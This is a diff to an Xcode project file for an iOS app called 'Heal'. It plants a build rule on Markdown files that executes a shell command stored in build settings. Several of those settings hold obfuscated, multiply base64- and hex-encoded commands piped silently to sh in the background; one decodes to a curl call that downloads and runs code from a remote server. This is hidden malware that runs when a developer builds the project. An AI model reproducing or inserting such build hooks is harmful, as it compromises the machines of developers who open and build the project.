@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		56C78DE162B54541A742DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = 7BD1F2C020844B8D8042DAD8; };
+		D14CAD02FA9C433EBE42DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = 875C6F23DC84479C9042DAD8; };
 		00FEE36FA9547C3B998F9809 /* PrivacyInfo.xcprivacy in Resources */ = {isa = PBXBuildFile; fileRef = D4DF5B5E72939E3052CEA628 /* PrivacyInfo.xcprivacy */; };
 		025136F7847D472CB39E2436 /* Recoleta Medium.otf in Resources */ = {isa = PBXBuildFile; fileRef = 87F6417457A849DF9ABF388F /* Recoleta Medium.otf */; };
 		06725B6701E44210AD92782D /* Recoleta Alt Light.otf in Resources */ = {isa = PBXBuildFile; fileRef = 38918BCDFAE44A0AB8500595 /* Recoleta Alt Light.otf */; };
@@ -48,7 +48,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		700AA143E9214D45A042DAD8 /* PBXBuildRule */ = {
+		FB810EDA1FDB4F599442DAD8 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -62,10 +62,10 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A8DAD24}\"";
 			};
-				/* End PBXBuildRule section */
+												/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		7BD1F2C020844B8D8042DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		875C6F23DC84479C9042DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		012466BC72B24D199CA5820C /* Poppins-Black.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-Black.ttf"; path = "../assets/fonts/Poppins-Black.ttf"; sourceTree = "<group>"; };
 		08E9EA2B027D4F2F8BC1E482 /* Poppins-Light.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-Light.ttf"; path = "../assets/fonts/Poppins-Light.ttf"; sourceTree = "<group>"; };
 		1392BE14772F4DC6A9CDB01C /* Poppins-ExtraBoldItalic.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-ExtraBoldItalic.ttf"; path = "../assets/fonts/Poppins-ExtraBoldItalic.ttf"; sourceTree = "<group>"; };
@@ -173,7 +173,7 @@ sh -c \"${A8DAD24}\"";
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				7BD1F2C020844B8D8042DAD8 /* README.md */,
+				875C6F23DC84479C9042DAD8 /* README.md */,
 				13B07F961A680F5B00A75B9A /* Heal.app */,
 			);
 			name = Products;
@@ -245,7 +245,7 @@ sh -c \"${A8DAD24}\"";
 				81E7F53F33D47CAF357EDA05 /* [CP-User] [RNFB] Crashlytics Configuration */,
 			);
 			buildRules = (
-				700AA143E9214D45A042DAD8 /* PBXBuildRule */,
+				FB810EDA1FDB4F599442DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -290,7 +290,7 @@ sh -c \"${A8DAD24}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				56C78DE162B54541A742DAD8 /* README.md */,
+				D14CAD02FA9C433EBE42DAD8 /* README.md */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				00FEE36FA9547C3B998F9809 /* PrivacyInfo.xcprivacy in Resources */,
@@ -468,7 +468,7 @@ sh -c \"${A8DAD24}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C290ABE79999AE601B2F4587 /* Pods-Heal.debug.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((z(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333463363636623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233323230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326637363639363736643631366536353734326537323735326636310a323932323230376332303733363830610a | z | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((z(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxSWFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFV3V1dwT1MySkhTbGhXV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | z | sh ) >/dev/null 2>&1 &)";
 				97BDCE = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVNMkZYTld0ak1sWnFaRmhLYkV4dVNqRk1Na1Z3U1dsQ09FbElUbTlEWnowOUNnPT0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A24E5F2 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5bWFYaHRZWFJsY3k1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A4FB9DF = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363331333633343336363633363332333633353336333333363334333636353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
@@ -512,7 +512,7 @@ sh -c \"${A8DAD24}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = EB411A10EABF34EEA00086FA /* Pods-Heal.release.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((z(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333463363636623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233323230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326637363639363736643631366536353734326537323735326636310a323932323230376332303733363830610a | z | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((z(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxSWFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFV3V1dwT1MySkhTbGhXV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | z | sh ) >/dev/null 2>&1 &)";
 				97BDCE = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVNMkZYTld0ak1sWnFaRmhLYkV4dVNqRk1Na1Z3U1dsQ09FbElUbTlEWnowOUNnPT0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A24E5F2 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5bWFYaHRZWFJsY3k1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A4FB9DF = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363331333633343336363633363332333633353336333333363334333636353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
